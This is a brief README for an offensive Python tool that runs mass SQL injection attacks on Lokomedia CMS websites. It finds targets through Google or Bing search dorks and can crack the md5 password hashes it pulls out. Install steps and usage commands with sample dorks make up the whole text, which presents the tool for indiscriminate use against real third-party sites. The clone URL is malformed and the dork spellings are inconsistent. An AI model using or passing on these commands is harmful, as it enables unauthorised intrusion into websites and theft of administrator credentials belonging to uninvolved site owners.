# sqlokmed
Made with ♥ by Dipkill
sqlokmed has python3 script for exploiting CMS Lokomedia with SQL injection attack [MASS] with dork [Google & Bing]
# Installing
```bash
apt-get install python3 git python3-pip
```
```bash
git clone https://github/Dipkill/sqlokmed.git
```
``` bash
pip install -r requirements.txt
```
# Usage
For dorking google:
``` bash
./sqlokmed.py --dork inurl:statis-4-kategori.html --google
```

For dorking Bing (Not recomended):
``` bash
./sqlokmed.py --dork statis-4-kategory.html --bing
```

If you want to crack md5 password (is any) put --auto-hash in parameter ex.
``` bash
./sqlokmed.py --dork inurl:statis-4-kategory.html --google --auto-hash
```

For Help
```bash
./sqlokmed.py -h
```
